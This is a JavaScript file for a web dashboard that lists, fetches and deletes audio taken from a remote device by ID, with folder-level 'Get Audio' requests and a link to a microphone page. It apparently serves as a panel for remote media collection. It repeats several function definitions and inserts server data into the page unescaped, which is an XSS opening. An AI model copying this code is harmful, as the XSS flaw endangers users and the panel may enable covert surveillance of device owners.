const params = new URLSearchParams(location.search);

const deviceId = params.get("deviceId");

let audios = [];

const pageSize = 12;

let currentPage = 1;

console.log("Device ID :", deviceId);

loadFolders();

loadAudios();



async function loadAudios() {

    const response =
        await fetch("/media/audio/" + deviceId);

    document.getElementById("totalCount").innerHTML =
        "Total Audios : " + audios.length;

    const result =
        await response.json();

    console.log(result);

    audios = result.data || [];

    renderPage();

}



function renderPage() {

    const start =
        (currentPage - 1) * pageSize;

    const end =
        start + pageSize;

    const page =
        audios.slice(start, end);

    let html = "";

    page.forEach(audio => {

        html += `

<div class="col-6 col-md-4 col-lg-3">

<div class="card audio-card h-100">

<div class="card-body">

<h6 class="fw-bold text-truncate">

<i class="bi bi-file-earmark-music"></i>

${audio.audioName}

</h6>

<audio controls>

<source src="${audio.audioUrl}">

</audio>

<div class="mt-2">

<small class="text-muted d-block">

<b>Folder :</b>

${audio.folderName}

</small>

<small class="text-muted d-block">

<b>Duration :</b>

${audio.duration}

</small>

<small class="text-muted d-block">

<b>Size :</b>

${formatSize(audio.audioSize)}

</small>

</div>

<div class="d-grid mt-3">

<a
href="${audio.audioUrl}"
download
class="btn btn-primary btn-sm">

<i class="bi bi-download"></i>

Download

</a>

</div>

</div>

</div>

</div>

`;

    });



    if (audios.length === 0) {

        html = `

<div class="col-12">

<div class="alert alert-warning text-center">

No Audio Uploaded

</div>

</div>

`;

    }

    document.getElementById("audioGrid").innerHTML = html;

    renderPagination();

}



function renderPagination() {

    let html = "";

    const total =
        Math.ceil(audios.length / pageSize);

    for (let i = 1; i <= total; i++) {

        html += `

<li class="page-item ${i == currentPage ? "active" : ""}">

<button
class="page-link"
onclick="gotoPage(${i})">

${i}

</button>

</li>

`;

    }

    pagination.innerHTML = html;

}



function gotoPage(page) {

    currentPage = page;

    renderPage();

}



function formatSize(bytes) {

    if (!bytes)
        return "0 B";

    if (bytes < 1024)
        return bytes + " B";

    if (bytes < 1024 * 1024)
        return (bytes / 1024).toFixed(2) + " KB";

    if (bytes < 1024 * 1024 * 1024)
        return (bytes / 1024 / 1024).toFixed(2) + " MB";

    return (bytes / 1024 / 1024 / 1024).toFixed(2) + " GB";

}

async function loadFolders() {

    const response =
        await fetch("/media/audio/folders/" + deviceId);

    const result =
        await response.json();

    console.log(result);

    const folders =
        result.data || [];

    let html = "";

    folders.forEach(folder => {

        if (folders.length === 0) {

            document.getElementById("folderGrid").innerHTML = `

        <div class="col-12">

            <div class="alert alert-warning text-center">

                No Audio Folder Found

            </div>

        </div>

    `;

            return;

        }

        html += `

                <div class="col-4 col-md-4 col-lg-3">
                
                <div class="card folder-card h-100">
                
                <div class="card-body text-center">
                
                <div class="folder-icon">
                
                🎵
                
                </div>
                
                <div class="folder-name">
                
                ${folder.folderName}
                
                </div>
                
                <div class="text-muted folder-count mb-2">
                
                ${folder.audioCount} Audios
                
                </div>
                
                <button
                class="btn btn-primary btn-sm"
                onclick="requestAudio('${folder.bucketId}')">
                
                Get Audio
                
                </button>
                
                </div>
                
                </div>
                
                </div>
                
                `;

    });

    document.getElementById("folderGrid").innerHTML = html;

}



async function requestAudio(bucketId) {

    const payload = {

        deviceId: deviceId,

        bucketId: bucketId,

        limit: parseInt(
            document.getElementById("audioLimit").value
        ),

        offset: parseInt(
            document.getElementById("audioOffset").value
        ),

        order:
            document.getElementById("audioOrder").value

    };

    const response =
        await fetch(

            "/media/audio/refresh",

            {

                method: "POST",

                headers: {

                    "Content-Type": "application/json"

                },

                body: JSON.stringify(payload)

            }

        );

    if (response.ok) {

        alert("Audio Request Sent");

    }
    else {

        alert("Request Failed");

    }

}



async function deleteAllAudios() {

    if (!confirm("Delete all audios ?")) {

        return;

    }

    const response =
        await fetch(

            "/media/audio/" + deviceId,

            {

                method: "DELETE"

            }

        );

    if (response.ok) {

        alert("Deleted Successfully");

        loadAudios();

    }
    else {

        alert("Delete Failed");

    }

}



function openMicPage() {

    window.location.href =
        "/mic.html?deviceId=" +
        encodeURIComponent(deviceId);

}



// Auto Refresh

setInterval(function () {

    loadAudios();

}, 10000);

// ----------------------------
// Refresh Folder & Audio
// ----------------------------

async function refreshData() {

    try {

        await loadFolders();

        await loadAudios();

    }
    catch (e) {

        console.error(e);

    }

}



// ----------------------------
// Reload after Request
// ----------------------------

async function requestAudio(bucketId) {

    const payload = {

        deviceId: deviceId,

        bucketId: bucketId,

        limit: parseInt(document.getElementById("audioLimit").value),

        offset: parseInt(document.getElementById("audioOffset").value),

        order: document.getElementById("audioOrder").value

    };

    try {

        const response = await fetch(

            "/media/audio/refresh",

            {

                method: "POST",

                headers: {

                    "Content-Type": "application/json"

                },

                body: JSON.stringify(payload)

            }

        );

        const result = await response.json();

        alert(result.message || "Request Sent");

    }
    catch (e) {

        alert("Unable to send request.");

    }

}



// ----------------------------
// Delete All
// ----------------------------

async function deleteAllAudios() {

    if (!confirm("Delete all audios ?")) {

        return;

    }

    try {

        const response = await fetch(

            "/media/audio/" + deviceId,

            {

                method: "DELETE"

            }

        );

        if (response.ok) {

            alert("Deleted Successfully");

            refreshData();

        }
        else {

            alert("Delete Failed");

        }

    }
    catch (e) {

        console.error(e);

        alert("Delete Failed");

    }

}



// ----------------------------
// Mic Page
// ----------------------------

function openMicPage() {

    if (!deviceId) {

        alert("Device Not Found");

        return;

    }

    window.location.href =
        "/mic.html?deviceId=" +
        encodeURIComponent(deviceId);

}



// ----------------------------
// Auto Refresh
// ----------------------------

const refreshTimer = setInterval(() => {

    loadAudios();

}, 10000);



// ----------------------------
// Stop Timer
// ----------------------------

window.addEventListener("beforeunload", function () {

    clearInterval(refreshTimer);

});